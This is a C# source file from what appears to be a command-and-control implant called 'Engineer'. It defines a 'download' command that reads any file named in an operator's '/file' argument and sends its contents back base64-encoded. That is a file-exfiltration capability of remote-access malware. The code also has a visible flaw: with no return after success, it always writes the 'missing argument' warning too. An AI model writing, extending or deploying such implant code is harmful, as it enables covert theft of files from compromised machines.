using Engineer.Functions;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class Download : EngineerCommand
    {
        public override string Name => "download";

        public override async Task Execute(EngineerTask task)
        {
            try
            {

                //read file from file string as a byte array and return it
                if (task.Arguments.TryGetValue("/file", out string file))
                {
                    byte[] content = File.ReadAllBytes(file);
                    Tasking.FillTaskResults(Convert.ToBase64String(content),task, EngTaskStatus.Complete,TaskResponseType.String);
                }
                Tasking.FillTaskResults("missing /file argument for download target",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
            }
            catch (Exception ex)
            {
                Tasking.FillTaskResults("error: " + ex.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
            }

        }
    }
}
